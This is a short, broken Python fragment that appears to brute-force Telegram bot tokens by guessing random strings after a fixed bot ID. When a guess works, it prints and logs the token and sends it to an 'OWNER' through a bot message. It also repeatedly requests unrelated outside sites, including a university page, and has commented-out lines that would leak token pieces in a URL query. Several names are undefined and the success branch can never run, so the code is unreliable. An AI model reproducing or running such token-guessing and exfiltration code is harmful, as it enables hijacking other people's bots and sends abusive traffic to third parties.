#ADMlNxd AKKU
import requests
url = "https://bepractical.tech/"
url = "http://173.214.161.242/responsive-design-define/?amp=1"
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
for k in range(1000):
  token = "609517172:" + "".join(random.choices(chars,k=35))
  new_bot = Bot(token)
  try:
    #requests.get(url);
    requests.get("http://nitp.ac.in/php/home.php")
    username = None
  except:
    username = None
    pass
  if username:
    print(token)
    LOGGING(username)
    LOGGING(token[11:])
    new_bot.send_message(OWNER, token)
    LOGGING("Har Har Mahadev 🚩")
    LOGGING("#FOUND")
    LOGGING("🚩 JAI SHREE RAM\n"*20)
  if botNo == THREAD_COUNT - 1:
    #requests.get(url+"?s="+token[15:20]);
    ATTEMPT += 1
    if ATTEMPT % 500 == 0:
      LOGGING(f"🧔 #TASK\n#{GROUP_NAME} Group have completed {ATTEMPT} attempt with {THREAD_COUNT} Bots")
